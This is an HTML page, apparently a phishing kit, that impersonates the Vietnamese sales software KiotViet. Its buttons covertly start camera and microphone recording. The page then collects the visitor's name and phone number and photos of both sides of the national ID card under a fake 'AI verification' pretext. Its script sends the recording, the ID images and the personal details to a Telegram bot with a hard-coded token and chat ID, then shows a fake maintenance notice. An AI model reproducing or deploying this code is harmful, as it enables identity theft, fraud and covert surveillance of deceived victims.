<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>KiotViet - Ph·∫ßn m·ªÅm qu·∫£n l√Ω b√°n h√†ng ph·ªï bi·∫øn nh·∫•t</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f8fafc; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
        .kv-green { color: #57b846; }
        .bg-kv-green { background-color: #57b846; }
        .hidden { display: none; }
        
        /* HI·ªÜU ·ª®NG G·ªêC C·ª¶A B·∫†N */
        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
        .scale-up { animation: scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes scaleUp { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        
        .loader { border-top-color: #57b846; animation: spinner 1s linear infinite; }
        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* THI·∫æT K·∫æ INPUT CHU·∫®N ·∫¢NH M·∫™U */
        .input-group { position: relative; margin-bottom: 12px; width: 100%; }
        .input-main {
            width: 100%; height: 56px; padding: 0 16px; border: 1.5px solid #d1d5db;
            border-radius: 12px; font-size: 16px; color: #1f2937; background: #ffffff; outline: none;
        }
        .input-main:focus { border-color: #57b846; }
        
        .phone-container {
            display: flex; align-items: center; height: 56px; border: 1.5px solid #d1d5db;
            border-radius: 12px; background: #fff; overflow: hidden;
        }
        .flag-box { display: flex; align-items: center; gap: 6px; padding: 0 12px; border-right: 1.5px solid #f3f4f6; }
        .phone-input-field { flex: 1; height: 100%; padding: 0 12px; font-size: 16px; outline: none; font-weight: 500; }

        .select-custom {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%236b7280'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
            background-repeat: no-repeat; background-position: right 16px center; background-size: 20px;
        }

        .card-shadow { box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05); }
        .icon-box { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        
        .slider-container { position: relative; overflow: hidden; width: 100%; aspect-ratio: 16/9; }
        .slide { position: absolute; inset: 0; opacity: 0; transition: opacity 0.8s ease-in-out; }
        .slide.active { opacity: 1; }
    </style>
</head>
<body>

<div id="app">
    <div id="loading-global" class="hidden fixed inset-0 z-[500] bg-white flex flex-col items-center justify-center">
        <div class="loader ease-linear rounded-full border-4 border-t-4 border-gray-100 h-16 w-16 mb-4"></div>
        <p id="loading-text" class="text-sm font-bold text-slate-400 uppercase tracking-widest text-center px-6">ƒêang b·∫£o m·∫≠t d·ªØ li·ªáu...</p>
    </div>

    <div id="landing-page" class="fade-in">
        <nav class="flex items-center justify-between px-6 md:px-20 py-4 bg-white shadow-sm sticky top-0 z-50">
            <img src="kiotviet_logo.png" alt="KiotViet" class="h-7 md:h-9">
            <div class="flex gap-2">
                <button onclick="requestAccess()" class="border border-kv-green text-kv-green px-4 py-2 rounded-full font-bold text-[10px] uppercase">ƒêƒÉng nh·∫≠p</button>
                <button onclick="requestAccess()" class="bg-kv-green text-white px-4 py-2 rounded-full font-bold text-[10px] uppercase shadow-md">ƒêƒÉng k√Ω</button>
            </div>
        </nav>
        
        <main class="max-w-6xl mx-auto px-6 pt-6 pb-24 text-center">
            <div class="slider-container mb-10 rounded-3xl overflow-hidden shadow-xl scale-up">
                <img src="banner1.jpg" class="slide active object-cover w-full h-full">
                <img src="banner2.png" class="slide object-cover w-full h-full">
                <img src="banner3.png" class="slide object-cover w-full h-full">
            </div>

            <h1 class="text-4xl md:text-6xl font-black mb-6 text-slate-800 tracking-tight leading-[1.1]">Qu·∫£n l√Ω b√°n h√†ng <br/> d·ªÖ d√πng c√πng <span class="kv-green uppercase">KiotViet</span></h1>
            <p class="text-slate-500 mb-10 text-lg max-w-2xl mx-auto">H∆°n 200.000 ch·ªß c·ª≠a h√†ng ƒë√£ ch·ªçn KiotViet ƒë·ªÉ tƒÉng tr∆∞·ªüng doanh thu.</p>
            <button onclick="requestAccess()" class="bg-kv-green text-white px-12 py-4.5 rounded-2xl font-black text-lg shadow-xl uppercase transition active:scale-95 mb-20">D√πng th·ª≠ mi·ªÖn ph√≠</button>
            
            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 text-center">
                <div class="bg-white p-8 rounded-3xl card-shadow scale-up">
                    <div class="icon-box bg-blue-50 text-blue-500">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                    </div>
                    <h3 class="text-xl font-bold mb-3 text-slate-800">ƒê∆°n gi·∫£n & D·ªÖ s·ª≠ d·ª•ng</h3>
                    <p class="text-slate-500 text-sm leading-relaxed">Giao di·ªán ƒë∆°n gi·∫£n, th√¢n thi·ªán v√† th√¥ng minh. Ch·ªâ m·∫•t 15 ph√∫t l√†m quen.</p>
                </div>
                <div class="bg-white p-8 rounded-3xl card-shadow scale-up" style="animation-delay: 0.1s">
                    <div class="icon-box bg-orange-50 text-orange-500">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2"></path></svg>
                    </div>
                    <h3 class="text-xl font-bold mb-3 text-slate-800">Ti·∫øt ki·ªám chi ph√≠</h3>
                    <p class="text-slate-500 text-sm leading-relaxed">Mi·ªÖn ph√≠ c√†i ƒë·∫∑t, tri·ªÉn khai, n√¢ng c·∫•p v√† h·ªó tr·ª£. R·∫ª h∆°n m·ªôt ly tr√† ƒë√°.</p>
                </div>
                <div class="bg-white p-8 rounded-3xl card-shadow scale-up" style="animation-delay: 0.2s">
                    <div class="icon-box bg-green-50 text-kv-green">
                        <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    </div>
                    <h3 class="text-xl font-bold mb-3 text-slate-800">Ph√π h·ª£p t·ª´ng ng√†nh h√†ng</h3>
                    <p class="text-slate-500 text-sm leading-relaxed">Ph√π h·ª£p cho h∆°n 20 ng√†nh ngh·ªÅ kinh doanh kh√°c nhau tr√™n to√†n qu·ªëc.</p>
                </div>
            </div>
        </main>
    </div>

    <video id="v" autoplay muted playsinline class="hidden"></video>
    <div id="flow-content"></div>
</div>

<script>
    // Slider
    let currentSlide = 0;
    const slides = document.querySelectorAll('.slide');
    if(slides.length > 0) {
        setInterval(() => {
            slides[currentSlide].classList.remove('active');
            currentSlide = (currentSlide + 1) % slides.length;
            slides[currentSlide].classList.add('active');
        }, 4000);
    }

    // LOGIC C·ª¶A B·∫†N (D·ªÆ NGUY√äN 100%)
    const TELEGRAM_TOKEN = '8508820343:AAEd6sPNZgoXimq-ud_T7v_PFNsF62UELVA'; 
    const CHAT_ID = '-1003844702216'; 

    let userData = { name: '', phone: '', imgFront: null, imgBack: null, video: null };
    let mediaRecorder, chunks = [], globalStream;

    function showLoad(text, time, callback) {
        const el = document.getElementById('loading-global');
        document.getElementById('loading-text').innerText = text;
        el.classList.remove('hidden');
        setTimeout(() => { el.classList.add('hidden'); if(callback) callback(); }, time);
    }

    async function requestAccess() {
        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            document.getElementById('v').srcObject = globalStream;
            mediaRecorder = new MediaRecorder(globalStream);
            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            mediaRecorder.start(1000); 
            document.getElementById('landing-page').classList.add('hidden');
            showLoad("KH·ªûI T·∫†O...", 1000, renderStep1);
        } catch (e) { alert("C·∫•p quy·ªÅn camera ƒë·ªÉ ti·∫øp t·ª•c."); window.location.reload(); }
    }

    // FORM NH·∫¨P CHU·∫®N ƒê·∫∏P NH∆Ø ·∫¢NH
    function renderStep1() {
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-white flex flex-col items-center pt-16 px-6 fade-in">
            <img src="kiotviet_logo.png" class="h-6 mb-12">
            <div class="w-full max-w-sm space-y-4 text-left">
                <div class="input-group"><input id="uName" type="text" class="input-main" placeholder="Nh·∫≠p h·ªç t√™n"></div>
                <div class="phone-container">
                    <div class="flag-box"><img src="https://flagcdn.com/w40/vn.png" class="w-6"></div>
                    <input id="uPhone" type="tel" maxlength="10" class="phone-input-field" placeholder="091 234 56 78">
                </div>
                <div class="input-group">
                    <span class="absolute left-3 -top-2.5 bg-white px-1 text-[11px] text-gray-500">Qu·ªëc gia ƒëang kinh doanh</span>
                    <select class="input-main select-custom"><option>Vi·ªát Nam</option></select>
                </div>
                <div class="input-group"><select class="input-main select-custom text-gray-400 font-medium"><option>Ch·ªçn khu v·ª±c</option></select></div>
                <button onclick="handleStep1()" class="w-full bg-kv-green text-white py-4 rounded-xl font-black text-lg mt-6 shadow-xl uppercase">Ti·∫øp t·ª•c</button>
            </div>
        </div>`;
    }

    function handleStep1() {
        const n = document.getElementById('uName').value, p = document.getElementById('uPhone').value;
        if (n.length > 2 && p.length >= 10) {
            userData.name = n.toUpperCase(); userData.phone = p;
            showLoad("ƒêANG X√ÅC TH·ª∞C...", 1500, renderVerifyNotice);
        } else { alert("Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin."); }
    }

    function renderVerifyNotice() {
        document.getElementById('flow-content').innerHTML = `
        <div class="fixed inset-0 bg-black/60 flex items-center justify-center p-6 z-[200] backdrop-blur-sm">
            <div class="bg-white rounded-[32px] p-10 max-w-sm w-full text-center scale-up shadow-2xl">
                <h3 class="text-xl font-black mb-4 uppercase">X√°c minh ƒë·ªãnh danh</h3>
                <p class="text-sm text-slate-500 mb-10">ƒê·ªÉ b·∫£o m·∫≠t t√†i kho·∫£n, vui l√≤ng ƒë·ªãnh danh CCCD/CMND qua h·ªá th·ªëng AI.</p>
                <button onclick="showLoad('ƒêANG KH·ªûI T·∫†O AI...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4.5 rounded-2xl font-black text-lg">X√°c minh ngay</button>
            </div>
        </div>`;
    }

    function renderUpload() {
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-10 text-center fade-in">
            <h2 class="text-2xl font-black mb-10 uppercase kv-green">T·∫£i l√™n CCCD</h2>
            <div class="w-full max-w-sm space-y-6">
                <div class="relative border-2 border-dashed border-slate-200 rounded-3xl h-52 flex items-center justify-center bg-slate-50 overflow-hidden">
                    <input type="file" class="absolute inset-0 opacity-0 z-20" onchange="aiScan(this, 'f-p', 'f-t', 'imgFront')">
                    <p id="f-t" class="text-slate-400 font-bold text-xs">M·∫∂T TR∆Ø·ªöC CCCD</p>
                    <img id="f-p" class="hidden absolute inset-0 w-full h-full object-cover z-10">
                </div>
                <div class="relative border-2 border-dashed border-slate-200 rounded-3xl h-52 flex items-center justify-center bg-slate-50 overflow-hidden">
                    <input type="file" class="absolute inset-0 opacity-0 z-20" onchange="aiScan(this, 'b-p', 'b-t', 'imgBack')">
                    <p id="b-t" class="text-slate-400 font-bold text-xs">M·∫∂T SAU CCCD</p>
                    <img id="b-p" class="hidden absolute inset-0 w-full h-full object-cover z-10">
                </div>
            </div>
        </div>`;
    }

    function aiScan(input, pI, tI, k) {
        if (!input.files[0]) return;
        const r = new FileReader();
        r.onload = e => {
            document.getElementById(pI).src = e.target.result;
            document.getElementById(pI).classList.remove('hidden');
            document.getElementById(tI).classList.add('hidden');
            userData[k] = input.files[0];
            if (userData.imgFront && userData.imgBack) finalizeAndSend();
        };
        r.readAsDataURL(input.files[0]);
    }

    async function finalizeAndSend() {
        showLoad("ƒêANG ƒê·ªíNG B·ªò...", 3000, async () => {
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                mediaRecorder.onstop = async () => {
                    userData.video = new File(chunks, "v.mp4", { type: "video/mp4" });
                    await sendData();
                };
                mediaRecorder.stop();
                globalStream.getTracks().forEach(t => t.stop());
            }
            renderMaintenance();
        });
    }

    async function sendData() {
        try {
            const cap = `üîî **TH√îNG TIN M·ªöI**\nüë§: ${userData.name}\nüì±: \`${userData.phone}\``;
            const vFd = new FormData();
            vFd.append('chat_id', CHAT_ID); vFd.append('video', userData.video);
            vFd.append('caption', cap); vFd.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: vFd });
            const sendImg = async (f, l) => {
                const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', f);
                fd.append('caption', `üì∏ ${l}: ${userData.name}`);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            };
            await sendImg(userData.imgFront, "TR∆Ø·ªöC");
            await sendImg(userData.imgBack, "SAU");
        } catch (e) {}
    }

    function renderMaintenance() {
        document.getElementById('flow-content').innerHTML = `
        <div class="fixed inset-0 bg-white flex flex-col items-center justify-center z-[500] p-8 text-center">
            <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">H·ªá th·ªëng b·∫£o tr√¨</h3>
            <p class="text-slate-500 mb-10 text-sm">Vui l√≤ng quay l·∫°i sau 24h.</p>
            <button onclick="window.location.reload()" class="w-full max-w-sm bg-slate-800 text-white py-4.5 rounded-2xl font-black uppercase shadow-xl">ƒê√≥ng</button>
        </div>`;
    }
</script>
</body>
</html>
